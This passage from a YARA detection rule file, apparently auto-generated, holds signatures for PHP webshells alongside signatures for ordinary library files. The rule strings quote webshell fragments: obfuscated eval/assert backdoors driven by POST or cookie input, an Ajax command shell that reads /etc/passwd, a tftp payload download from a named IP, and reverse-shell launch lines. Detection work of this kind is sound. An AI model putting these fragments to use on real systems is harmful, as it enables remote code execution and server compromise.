      $s4 = "foreach ($GLOBALS[$GLOBALS['d88c71f1'][52].$GLOBALS['d88c71f1'][37].$GLOBALS['d88c71f1'][46].$GLOBALS['d88c71f1'][96].$GLOBA" fullword ascii
      $s5 = "echo @$GLOBALS[$GLOBALS['d88c71f1'][52].$GLOBALS['d88c71f1'][40].$GLOBALS['d88c71f1'][15].$GLOBALS['d88c71f1'][15].$GLOB" fullword ascii
      $s6 = "14].$GLOBALS['d88c71f1'][96].$GLOBALS['d88c71f1'][46].$GLOBALS['d88c71f1'][46].$GLOBALS['d88c71f1'][14]]($q174), $mb218));" fullword ascii
      $s7 = "d88c71f1'][32].$GLOBALS['d88c71f1'][37].$GLOBALS['d88c71f1'][97].$GLOBALS['d88c71f1'][42].$GLOBALS['d88c71f1'][42]]($q174);)" fullword ascii
      $s8 = "return $GLOBALS[$GLOBALS['d88c71f1'][84].$GLOBALS['d88c71f1'][96].$GLOBALS['d88c71f1'][30].$GLOBALS['d88c71f1'][42]]($GLOBAL" fullword ascii
      $s9 = "S[$GLOBALS['d88c71f1'][84].$GLOBALS['d88c71f1'][96].$GLOBALS['d88c71f1'][30].$GLOBALS['d88c71f1'][42]]($q174, $l7da), $a8295);" fullword ascii
      $s10 = "$GLOBALS['d88c71f1'][8].$GLOBALS['d88c71f1'][12] => @$GLOBALS[$GLOBALS['d88c71f1'][53].$GLOBALS['d88c71f1'][42].$GLO" fullword ascii
      $s11 = "$v3fc5 .= $GLOBALS[$GLOBALS['d88c71f1'][53].$GLOBALS['d88c71f1'][42].$GLOBALS['d88c71f1'][97].$GLOBALS['d88c71f1'][4" fullword ascii
      $s12 = "$GLOBALS['d88c71f1'][83].$GLOBALS['d88c71f1'][12] => $GLOBALS['d88c71f1'][40].$GLOBALS['d88c71f1'][31].$GLOBALS['d88" fullword ascii
      $s13 = "88c71f1'][37].$GLOBALS['d88c71f1'][97].$GLOBALS['d88c71f1'][42].$GLOBALS['d88c71f1'][97].$GLOBALS['d88c71f1'][46];" fullword ascii
      $s14 = "][76].$GLOBALS['d88c71f1'][32].$GLOBALS['d88c71f1'][53]] = $_POST;" fullword ascii
      $s15 = "][60]] = $GLOBALS['d88c71f1'][97].$GLOBALS['d88c71f1'][2].$GLOBALS['d88c71f1'][77].$GLOBALS['d88c71f1'][42];" fullword ascii
      $s16 = ".$GLOBALS['d88c71f1'][47].$GLOBALS['d88c71f1'][4].$GLOBALS['d88c71f1'][47].$GLOBALS['d88c71f1'][83], 0);" fullword ascii
      $s17 = "8c71f1'][42].$GLOBALS['d88c71f1'][32].$GLOBALS['d88c71f1'][42].$GLOBALS['d88c71f1'][37]]($a8295[$c3758cb0]));" fullword ascii
      $s18 = "'][17].$GLOBALS['d88c71f1'][14].$GLOBALS['d88c71f1'][77].$GLOBALS['d88c71f1'][17].$GLOBALS['d88c71f1'][15]](0);" fullword ascii
      $s19 = "][49].$GLOBALS['d88c71f1'][47].$GLOBALS['d88c71f1'][66].$GLOBALS['d88c71f1'][17].$GLOBALS['d88c71f1'][22];" fullword ascii
      $s20 = "BALS['d88c71f1'][60].$GLOBALS['d88c71f1'][76].$GLOBALS['d88c71f1'][17].$GLOBALS['d88c71f1'][60]]()," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      8 of them
}

rule article_fixture
{
   meta:
      description = "php17 - file article_fixture.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e8204597e5c8e7b505317e7b2c40da3b26fed3c9bd14cd0271a597474e167fe9"
   strings:
      $s1 = "* Copyright 2005-2012, Cake Software Foundation, Inc. (http://cakefoundation.org)" fullword ascii
      $s2 = "* @license       http://www.opensource.org/licenses/opengroup.php The Open Group Test Suite License" fullword ascii
      $s3 = "* @copyright     Copyright 2005-2012, Cake Software Foundation, Inc. (http://cakefoundation.org)" fullword ascii
      $s4 = "* CakePHP(tm) Tests <http://book.cakephp.org/view/1196/Testing>" fullword ascii
      $s5 = "*  Redistributions of files must retain the above copyright notice." fullword ascii
      $s6 = "* @link          http://book.cakephp.org/view/1196/Testing CakePHP(tm) Tests" fullword ascii
      $s7 = "*  Licensed under The Open Group Test Suite License" fullword ascii
      $s8 = "* Short description for file." fullword ascii
      $s9 = "* @var string 'Article'" fullword ascii
      $s10 = "* Short description for class." fullword ascii
      $s11 = "'user_id' => array('type' => 'integer', 'null' => false)," fullword ascii
      $s12 = "* records property" fullword ascii
      $s13 = "* fields property" fullword ascii
      $s14 = "* name property" fullword ascii
      $s15 = "'published' => array('type' => 'string', 'length' => 1, 'default' => 'N')," fullword ascii
      $s16 = "'id' => array('type' => 'integer', 'key' => 'primary')," fullword ascii
      $s17 = "'title' => array('type' => 'string', 'null' => false)," fullword ascii
      $s18 = "10:41:23', 'updated' => '2007-03-18 10:43:31')," fullword ascii
      $s19 = "0:43:23', 'updated' => '2007-03-18 10:45:31')" fullword ascii
      $s20 = "0:39:23', 'updated' => '2007-03-18 10:41:31')," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule sig_5bdae9780fa349f3b58c475985c13c012897bd61
{
   meta:
      description = "php17 - file 5bdae9780fa349f3b58c475985c13c012897bd61.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "af896e0ad20db413c0cc3b5a8cda278400c143b470de54f8ccdf6154592279fd"
   strings:
      $x1 = "echo Exec_Run('/tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : '" fullword ascii
      $x2 = "$exe = @$shell->exec(\"cmd.exe /c \".$cmd);" fullword ascii
      $x3 = "Str[8] = \"tftp -i 219.134.46.245 get server.exe c:\\\\\\\\server.exe\";" fullword ascii
      $x4 = "Str[6] = \"tftp -i 219.134.46.245 get server.exe c:\\\\server.exe\";" fullword ascii
      $x5 = "$run = isset($_POST['run']) ? $_POST['run'] : 'cmd.exe';" fullword ascii
      $x6 = "if(md5($_POST['spiderpass']) == md5($password)){die('<meta http-equiv=\"refresh\" content=\"1;URL=?\">');}" fullword ascii
      $x7 = "<input type=\"text\" name=\"tcb\" id=\"tcb\" value=\"http://www.baidu.com/download/muma.exe\" style=\"width:500px;\">';" fullword ascii
      $x8 = "if(!empty($_POST['cmd'])){$res = Exec_Run($_POST['cmd']);$cmd = $_POST['cmd'];}" fullword ascii
      $x9 = "elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x10 = "$query = \"INSERT into Spider_Temp_Tab values (CONVERT(\".$shellcode.\",CHAR));\";" fullword ascii
      $x11 = "echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] " ascii
      $x12 = "echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] " ascii
      $x13 = "$res = Exec_Run('gcc -o /tmp/angel_bc /tmp/angel_bc.c');" fullword ascii
      $x14 = "elseif(function_exists('system')){@ob_start();@system($cmd);$res = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x15 = "$adduser = \"-SETUSERSETUP\\r\\n\".\"-IP=0.0.0.0\\r\\n\".\"-PortNo=21\\r\\n\".\"-User=\".$_POST['user'].\"\\r\\n\".\"-Password=" ascii
      $x16 = ": &lt;script language=javascript src=\"http://www.baidu.com/ad.js?EMTDSU\"&gt;&lt;/script&gt;</div></div>" fullword ascii
      $x17 = "<div class=\"topbg\"> &nbsp; {$Server_IP} - {$Server_OS} - <a href=\"{$Server_Alexa}\" target=\"_blank\">Alexa</a></div>" fullword ascii
      $x18 = "$Com_durl = isset($_POST['durl']) ? $_POST['durl'] : 'http://www.baidu.com/down/muma.exe';" fullword ascii
      $x19 = "$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : 'copy c:\\windows\\php.ini c:\\php.ini';" fullword ascii
      $x20 = "if(isset($_POST['mhost']) && isset($_POST['mport']) && isset($_POST['muser']) && isset($_POST['mpass']))" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*)
}

rule AbstractElementGenerator
{
   meta:
      description = "php17 - file AbstractElementGenerator.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2202d17abecdd4eef7ff637527f8859f5432a850609514c67875990d9b34997d"
   strings:
      $x1 = "* Basic generator for all kinds of elements supporting pluggable filters (= exclude elements) and processors (= enrich" fullword ascii
      $s2 = "// processor returned null - stop processing and return null" fullword ascii
      $s3 = "* Processes a URL about to be added to the sitemap. Can either return an Url instance" fullword ascii
      $s4 = "* @param ProcessorInterface[] $processors" fullword ascii
      $s5 = "protected function process(Url $url, AbstractElement $element, GeneratorContextInterface $context)" fullword ascii
      $s6 = "* @var ProcessorInterface[]" fullword ascii
      $s7 = "* @return ProcessorInterface[]" fullword ascii
      $s8 = "public function getProcessors(): array" fullword ascii
      $s9 = "public function __construct(array $filters = [], array $processors = [])" fullword ascii
      $s10 = "public function addProcessor(ProcessorInterface $processor)" fullword ascii
      $s11 = "$url = $processor->process($url, $element, $context);" fullword ascii
      $s12 = "private $processors = [];" fullword ascii
      $s13 = "foreach ($this->processors as $processor) {" fullword ascii
      $s14 = "* Determines if the element handles children (only used from generators" fullword ascii
      $s15 = "$this->processors = $processors;" fullword ascii
      $s16 = "$this->processors[] = $processor;" fullword ascii
      $s17 = "* supporting tree structures)." fullword ascii
      $s18 = "* @param GeneratorContextInterface $context" fullword ascii
      $s19 = "protected function handlesChildren(AbstractElement $element, GeneratorContextInterface $context): bool" fullword ascii
      $s20 = "* @param FilterInterface[] $filters" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule AddCreditCommandHandler
{
   meta:
      description = "php17 - file AddCreditCommandHandler.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d996df814ac1fdde7c1cca053bce06dd67dddb853c7cc5844b3820ff9465ab08"
   strings:
      $s1 = "* Create a new report issue command handler instance." fullword ascii
      $s2 = "* @param \\Hifone\\Commands\\Credit\\AddCreditCommand $command" fullword ascii
      $s3 = "* Handle the report credit command." fullword ascii
      $s4 = "if (!$credit_rule || !$this->checkFrequency($credit_rule, $command->user)) {" fullword ascii
      $s5 = "$count = Credit::where('user_id', $user->id)->where('rule_id', $credit_rule->id)->where(function ($query) use ($credit_rule) {" fullword ascii
      $s6 = "$count = Credit::where('user_id', $user->id)->where('rule_id', $credit_rule->id)->where(function ($query) use ($credit_r" fullword ascii
      $s7 = "'balance'           => $command->user->score + $credit_rule->reward," fullword ascii
      $s8 = "$command->user->update(['score' => $credit->balance]);" fullword ascii
      $s9 = "* @param \\Hifone\\Services\\Dates\\DateFactory $dates" fullword ascii
      $s10 = "$credit_rule = CreditRule::whereSlug($command->action)->first();" fullword ascii
      $s11 = "* @var \\Hifone\\Services\\Dates\\DateFactory" fullword ascii
      $s12 = "protected function checkFrequency(CreditRule $credit_rule, \\Hifone\\Models\\User $user)" fullword ascii
      $s13 = "public function handle(AddCreditCommand $command)" fullword ascii
      $s14 = "namespace Hifone\\Handlers\\Commands\\Credit;" fullword ascii
      $s15 = "use Hifone\\Commands\\Credit\\AddCreditCommand;" fullword ascii
      $s16 = "* @return \\Hifone\\Models\\Credit" fullword ascii
      $s17 = "'user_id'           => $command->user->id," fullword ascii
      $s18 = "* The date factory instance." fullword ascii
      $s19 = "if (!in_array($credit_rule->frequency, [CreditRule::DAILY, CreditRule::ONCE])) {" fullword ascii
      $s20 = "use Hifone\\Services\\Dates\\DateFactory;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      8 of them
}

rule adodb_oracle_inc
{
   meta:
      description = "php17 - file adodb-oracle.inc.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "aff39a26a92759c60c20d05c29f6311eef722b4bc50a995a4dbd51a1f66dffef"
   strings:
      $s1 = "@copyright (c) 2000-2013 John Lim (jlim#natsoft.com). All rights reserved." fullword ascii
      $s2 = "@copyright (c) 2014      Damien Regad, Mark Newnham and the ADOdb community" fullword ascii
      $s3 = "function __construct($queryID,$mode=false)" fullword ascii
      $s4 = "function DBTimeStamp($ts, $isfld = false)" fullword ascii
      $s5 = "function DBDate($d, $isfld = false)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      all of them
}

rule sig_0a5236c99cebe28480901c836a5958ecec52747f
{
   meta:
      description = "php17 - file 0a5236c99cebe28480901c836a5958ecec52747f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "62b543efe55d54b921b69a981d85ffbeca246c4a6602e0df6b39fa6d76c726ca"
   strings:
      $s1 = "$parsed = yaml_parse($yaml, 0, $cnt, array(\"!{$_REQUEST['pass']}\" => 'preg_replace'));" fullword ascii
      $s2 = "$str = urlencode($_REQUEST['pass']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}


rule sig_01161aaa0b6d1345dd8fe4e481144d84
{
   meta:
      description = "php17 - file 01161aaa0b6d1345dd8fe4e481144d84.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c5d4fc483f20935840c34406a0208a52961c3aac8af04fd7867eae716f21db11"
   strings:
      $s1 = "''.JKHO.'(Sf z^52rIX%Y ;%'.rAIz.'<Y:'^'7u~`)};-}a:$'.h0zrd.#aFsaOJW41r2EYeygbk'." fullword ascii
      $s2 = "$QWjvcJA9='yBR9vVE'&~ix5NBYV;$yKddWx6KQV=\", 0\"|'ad!';$y5=HQPP.'^e'|'@'.ETPMd;'CKch487k3V'." fullword ascii
      $s3 = "'x)3--(<6(Gz?#97q)z');$B084iu=$DVKQgM2XG&$TgSzFvk;if($i_0f($C0Dk($gn))==$am)/*'." fullword ascii
      $s4 = "'*k{k}uj};:<#g4X')^(\"=wT^\".Jom8s.\")iU>#9\".WTFkhFwM.\"#CGk}WIp*\"^'o#(2y:(n Y1 OY'." fullword ascii
      $s5 = "'Ze}T_?';$p8ok0gOEzKx=xZu&'`E-';$i5CyU='zO4?f|'^'<jtZ\"(';$DVKQgM2XG=/*s4YhYL3M'." fullword ascii
      $s6 = "'z*/iDTPKLVJEEHQTAMXUZ|hRTIU0KGKOEp.\"[ IKP[\";$TgSzFvk='_T_~_{'._OoO.#pmpVypjzs'." fullword ascii
      $s7 = "'t=q';$C0Dk=$i5CyU|('wz|yov'&odva.'~w');$gn=(':i=6f('^s7HN9a)&$y5;$am=(PE39.'~'." fullword ascii
      $s8 = "'{__w~iM{'&'^'.v_U_Z_.'~O{{'.O___.'{[s';$i_0f=$yKddWx6KQV|$p8ok0gOEzKx;'epEycb'." fullword ascii
      $s9 = "'Wg*/eval($C0Dk($B084iu));#|?5F|47KnpksFL4k).Z}7+6zxo)mCPFfhy|?uI#U0AyOGkKoSM'." fullword ascii
      $s10 = "'u3vn)CbF:} 8.5e0wjT-$xny._te4c~wC!lFe9!xDK7UR';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule adodb_encrypt_mcrypt
{
   meta:
      description = "php17 - file adodb-encrypt-mcrypt.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7373ca3deabdc7d56c12f6e89c05b9d303692c4645d0f6a03707be5ca6b5ce6c"
   strings:
      $s1 = "@copyright (c) 2000-2013 John Lim (jlim#natsoft.com). All rights reserved." fullword ascii
      $s2 = "function __construct($cipher = null, $mode = null, $source = null) {" fullword ascii
      $s3 = "@copyright (c) 2014      Damien Regad, Mark Newnham and the ADOdb community" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      all of them
}

rule sig_53f02c344efa51a25495a377d9bc9434672e932f
{
   meta:
      description = "php17 - file 53f02c344efa51a25495a377d9bc9434672e932f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9a7dfddafef9981e0ce72131ee00ff270925b5515b0faa9656037e7cf931fc07"
   strings:
      $s1 = "//@eval($_POST['op']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_88f12cb66dd87e983391f1efa635abab467fae30
{
   meta:
      description = "php17 - file 88f12cb66dd87e983391f1efa635abab467fae30.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7b8a3bcb3d75a95399207f08ac08a467519db02d0d79eec3857970025254970d"
   strings:
      $s1 = ":https://forum.90sec.org/forum.php?mod=viewthread&tid=7316" fullword ascii
      $s2 = "<[url=mailto:?@array_map($_GET[]?@array_map($_GET['f'],$_GET[/url]);?>" fullword ascii
      $s3 = "@preg_replace(\"/f/e\",$_GET['u'],\"fengjiao\"); " fullword ascii
   condition:
      uint16(0) == 0xbde8 and filesize < 1KB and
      all of them
}

rule a7cfc1f1922e461c5d9ad97ffa909ce4e90d165a
{
   meta:
      description = "php17 - file a7cfc1f1922e461c5d9ad97ffa909ce4e90d165a.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "57d79517599c1afbe80f378c0818bd2b5261cde728a540e595c12bbcfd9e7286"
   strings:
      $s1 = "$__F_F.='_'.$__P_P[5].$__P_P[20].$__P_P[13].$__P_P[2].$__P_P[19].$__P_P[8].$__P_P[14].$__P_P[13];" fullword ascii
      $s2 = "$__H_H=$__B_B.$__O_O.$__P_P[3].$__P_P[4].$__P_P[2].$__P_P[14].$__P_P[3].$__P_P[4];" fullword ascii
      $s3 = "$__F_F=$__P_P[2].$__P_P[17].$__P_P[4].$__P_P[0].$__P_P[19].$__P_P[4];" fullword ascii
      $s4 = "$__E_E=$__P_P[4].$__P_P[21].$__P_P[0].$__P_P[11];" fullword ascii
      $s5 = "$__B_B=$__P_P{1}.$__P_P[0].$__P_P[18].$__P_P[4];" fullword ascii
      $s6 = "$__C_C=\"WlhaaGJDZ2tYMUJQVTFSYmVGMHBPdz09\";" fullword ascii
      $s7 = "$_[00]=$__F_F('$__S_S',$__E_E.'(\"$__S_S\");');" fullword ascii
      $s8 = "@$_[00]($__H_H($__H_H($__C_C)));" fullword ascii
      $s9 = "$__O_O=$__X_X[5].$__X_X[3].\"_\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_7c102999b65267242a29b2b296f2ce992bd23e59
{
   meta:
      description = "php17 - file 7c102999b65267242a29b2b296f2ce992bd23e59.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "41b3f472978109cfb97abbcde05c81bf9085c356e7f890f805e1efd078bdf093"
   strings:
      $x1 = "print \"Ajax Command Shell by <a href=http://www.ironwarez.info>Ironfist</a>.<br>Version $version\";" fullword ascii
      $x2 = "<b style=\"cursor:crosshair\" onclick=\"set_tab('cmd');\">[Execute command]</b> " fullword ascii
      $x3 = "<title>Command Shell ~ <?php print getenv(\"HTTP_HOST\"); ?></title>" fullword ascii
      $x4 = "'Open ports' => \"runcommand('netstat -an | grep -i listen','GET')\"," fullword ascii
      $x5 = "<a href=\"http://www.milw0rm.com\" target=_blank>milw0rm</a>" fullword ascii
      $x6 = "If one of the command execution functions work, the shell will function fine. " fullword ascii
      $x7 = "'Running processes' => \"runcommand('ps -aux','GET')\"," fullword ascii
      $s8 = "&nbsp;&nbsp;&nbsp;<form name=\"cmdform\" onsubmit=\"return runcommand(document.cmdform.command.value,'GET');\">" fullword ascii
      $s9 = "<b><font size=3>Ajax/PHP Command Shell</b></font><br>by Ironfist" fullword ascii
      $s10 = "print '<b><font size=7>Ajax/PHP Command Shell</b></font>" fullword ascii
      $s11 = "//Execute any other command" fullword ascii
      $s12 = "'Read /etc/passwd' => \"runcommand('etcpasswdfile','GET')\"," fullword ascii
      $s13 = "if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {" fullword ascii
      $s14 = "<a href=\"http://www.ironwarez.info\" target=_blank>SharePlaza</a>" fullword ascii
      $s15 = "'clear','GET'); runcommand ('listdir \".realpath($directory).\"','GET'); \\\">\".$directory.\"</b><br>\";" fullword ascii
      $s16 = "\"&filecontent=\" + encodeURI( document.getElementById(\"area1\").value );" fullword ascii
      $s17 = "function runcommand(urltoopen,action,contenttosend){" fullword ascii
      $s18 = "print \"<b>\".get_current_user().\"~# </b>\". htmlspecialchars($cmd).\"<br>\";" fullword ascii
      $s19 = "elseif(isset($_GET['savefile']) && !empty($_POST['filetosave']) && !empty($_POST['filecontent']))" fullword ascii
      $s20 = "$target_path = $target_path . basename( $_FILES['uploadedfile']['name']); " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 60KB and
      1 of ($x*) and 4 of them
}

rule sig_201_enable_pagetypes
{
   meta:
      description = "php17 - file 201_enable_pagetypes.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "09c06ef01b8097e695fb202f83c6d5b137d9dd2a2a2c8443b31c7ccf57a2fb92"
   strings:
      $s1 = "$sql2 = \"ALTER TABLE `\" . $table3 . \"` ADD `pagetype` VARCHAR(140) NOT NULL DEFAULT 'all' AFTER `slug`\";" fullword ascii
      $s2 = "$sql2 = \"ALTER TABLE `\" . $table2 . \"` ADD `pagetype` VARCHAR(140) NOT NULL DEFAULT 'all' AFTER `type`\";" fullword ascii
      $s3 = "if (!$this->has_table_column($table2, 'pagetype')) {" fullword ascii
      $s4 = "if (!$this->has_table_column($table3, 'pagetype')) {" fullword ascii
      $s5 = "$table = Base::table('pagetypes');" fullword ascii
      $s6 = "class Migration_enable_pagetypes extends Migration" fullword ascii
      $s7 = "$sql = \"CREATE TABLE IF NOT EXISTS `\" . $table . \"` (" fullword ascii
      $s8 = "`key` varchar(32) NOT NULL," fullword ascii
      $s9 = "Query::table($table)->insert(array(" fullword ascii
      $s10 = "$table2 = Base::table('extend');" fullword ascii
      $s11 = "if (!$this->has_table($table)) {" fullword ascii
      $s12 = "'key' => 'all'," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule sig_39ec5e7c9c79f8c8f1de1456df7f4c2cf27bb039
{
   meta:
      description = "php17 - file 39ec5e7c9c79f8c8f1de1456df7f4c2cf27bb039.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8c78466fcf58f3908a0fbb68ef8461e6585279b986f7f782d22600a040a8ddd9"
   strings:
      $s1 = "${\"command\"}=$_POST[cmd];" fullword ascii
      $s2 = "$function($command);" fullword ascii
      $s3 = "${\"function\"}=substr(__FILE__,-10,-4);;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AfterCallAspect
{
   meta:
      description = "php17 - file AfterCallAspect.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "971e6d86e084c7b4bfc8a79890d08a53629f14e9a4c9e566dea21b980bcabacf"
   strings:
      $s1 = "* @author Marcus Nyeholt <marcus@silverstripe.com.au>" fullword ascii
      $s2 = "* @license BSD http://silverstripe.org/BSD-license" fullword ascii
      $s3 = "* An AfterCallAspect is run after a method is executed" fullword ascii
      $s4 = "* Call this aspect after a method is executed" fullword ascii
      $s5 = "* This is a declared interface, but isn't actually required" fullword ascii
      $s6 = "namespace SilverStripe\\Core\\Injector;" fullword ascii
      $s7 = "* @param object $proxied" fullword ascii
      $s8 = "* @param mixed $result" fullword ascii
      $s9 = "*              The arguments that were passed to the method call" fullword ascii
      $s10 = "*              The result of calling the method on the real object" fullword ascii
      $s11 = "*              The object having the method called upon it." fullword ascii
      $s12 = "*              The name of the method being called" fullword ascii
      $s13 = "* as PHP doesn't really care about types..." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule sig_2_2_disable_allowtagsinpost
{
   meta:
      description = "php17 - file 2.2-disable-allowtagsinpost.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d2d553242f1e3f5c84c79c8ef9ec4e42c08f6dd7dfc45235533d580fe3329bd9"
   strings:
      $x1 = "* Common upgrade script for disabling allow_tags_in_post System Setting" fullword ascii
      $s2 = "if ($object = $modx->getObject('modSystemSetting', array('key' => 'allow_tags_in_post', 'value' => '1'), false)) {" fullword ascii
      $s3 = "* See issue #9080." fullword ascii
      $s4 = "* @var modX $modx" fullword ascii
      $s5 = "* @package setup" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      1 of ($x*) and all of them
}

rule sig_23bd279e8cda9cec0bef32cb26bb27c14cf72bf9
{
   meta:
      description = "php17 - file 23bd279e8cda9cec0bef32cb26bb27c14cf72bf9.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f9910701afff2094b99271767eb8cf8fcbb11effe6e63e39afbaa1aa46d956e1"
   strings:
      $s1 = "$char_base64_decode='b'.$char_as.$char_e.(64).'_'.'d'.$char_e.'c'.'o'.'d'.$char_e;" fullword ascii
      $s2 = "@$char_assert(@$char_base64_decode('ZXZhbCgkX1BPU1RbMV0p'));" fullword ascii
      $s3 = "$char_assert=$char_as.'s'.$char_e.'r'.'t';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule a0d593a13cbd902c7f3610eaeb29067bc090739d
{
   meta:
      description = "php17 - file a0d593a13cbd902c7f3610eaeb29067bc090739d.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2c6a578719664ffae9ceba6438766d0ff6be5ba1aede5a83d3db14baa46316ab"
   strings:
      $s1 = "$arr = array($_POST['pass'],);" fullword ascii
      $s2 = "array_map(base64_decode($e), $arr);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule a2aa951532e35458b97cf650d7ace3a667ff4bd6
{
   meta:
      description = "php17 - file a2aa951532e35458b97cf650d7ace3a667ff4bd6.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "22e4604303ec8f506d0625a090098dd64db9ceac668815e11f0e339c0a0de3fb"
   strings:
      $s1 = "(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF(\"\",$_cC);@$_();?>" fullword ascii
   condition:
      uint16(0) == 0xbbef and filesize < 1KB and
      all of them
}

rule ad2e005a0136a921841d7398687c234e935527c0
{
   meta:
      description = "php17 - file ad2e005a0136a921841d7398687c234e935527c0.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "aee54b4812ad3ba06561182fc825e82e933232f982b11acb87d391f5e783ccf7"
   strings:
      $s1 = "S['he2def'][38].$GLOBALS['he2def'][13].$GLOBALS['he2def'][56].$GLOBALS['he2def'][1]] = $_COOKIE;" fullword ascii
      $s2 = "for ($n6b51e23c=0; $n6b51e23c<$GLOBALS[$GLOBALS['he2def'][33].$GLOBALS['he2def'][13].$GLOBALS['he2def'][76].$GLOBALS['he" fullword ascii
      $s3 = "foreach ($GLOBALS[$GLOBALS['he2def'][13].$GLOBALS['he2def'][27].$GLOBALS['he2def'][44].$GLOBALS['he2def'][13].$GLOBALS['he2d" fullword ascii
      $s4 = "[54].$GLOBALS['he2def'][36].$GLOBALS['he2def'][75].$GLOBALS['he2def'][49].$GLOBALS['he2def'][54].$GLOBALS['he2def'][33], NULL);" fullword ascii
      $s5 = "echo @$GLOBALS[$GLOBALS['he2def'][51].$GLOBALS['he2def'][44].$GLOBALS['he2def'][8].$GLOBALS['he2def'][79].$GLOBALS['he2d" fullword ascii
      $s6 = "return $GLOBALS[$GLOBALS['he2def'][9].$GLOBALS['he2def'][87].$GLOBALS['he2def'][38].$GLOBALS['he2def'][38]]($GLOBALS[$GLOBAL" fullword ascii
      $s7 = "].$GLOBALS['he2def'][38].$GLOBALS['he2def'][13].$GLOBALS['he2def'][56].$GLOBALS['he2def'][1]] as $b8db730=>$v97cf1de)" fullword ascii
      $s8 = "$GLOBALS['he2def'][74].$GLOBALS['he2def'][9] => @$GLOBALS[$GLOBALS['he2def'][35].$GLOBALS['he2def'][13].$GLOBALS['he" fullword ascii
      $s9 = "$GLOBALS['he2def'][68].$GLOBALS['he2def'][9] => $GLOBALS['he2def'][3].$GLOBALS['he2def'][97].$GLOBALS['he2def'][2].$" fullword ascii
      $s10 = "$g6d5c4 .= $GLOBALS[$GLOBALS['he2def'][41].$GLOBALS['he2def'][79].$GLOBALS['he2def'][79].$GLOBALS['he2def'][56].$GLO" fullword ascii
      $s11 = "S['he2def'][9].$GLOBALS['he2def'][87].$GLOBALS['he2def'][38].$GLOBALS['he2def'][38]]($c434e, $ra22), $b8db730);" fullword ascii
      $s12 = "2def'][87].$GLOBALS['he2def'][58].$GLOBALS['he2def'][76].$GLOBALS['he2def'][3].$GLOBALS['he2def'][3]]()," fullword ascii
      $s13 = "[13].$GLOBALS['he2def'][8].$GLOBALS['he2def'][58].$GLOBALS['he2def'][27].$GLOBALS['he2def'][84]]($c434e);)" fullword ascii
      $s14 = "ef'][41].$GLOBALS['he2def'][49].$GLOBALS['he2def'][43].$GLOBALS['he2def'][73].$GLOBALS['he2def'][87];" fullword ascii
      $s15 = "for ($pca961df=0; $pca961df<$GLOBALS[$GLOBALS['he2def'][33].$GLOBALS['he2def'][13].$GLOBALS['he2def'][76].$GLOBALS['he2def']" fullword ascii
      $s16 = "ALS['he2def'][79].$GLOBALS['he2def'][48].$GLOBALS['he2def'][48].$GLOBALS['he2def'][56]](0);" fullword ascii
      $s17 = "GLOBALS['he2def'][13].$GLOBALS['he2def'][76].$GLOBALS['he2def'][3].$GLOBALS['he2def'][13];" fullword ascii
      $s18 = "\\x37\\x7b\\x78\\x65\\x71\\x3a\\x40\\x22\\x9\\x25\\x54\\x20\\x27\\x2e\";" fullword ascii
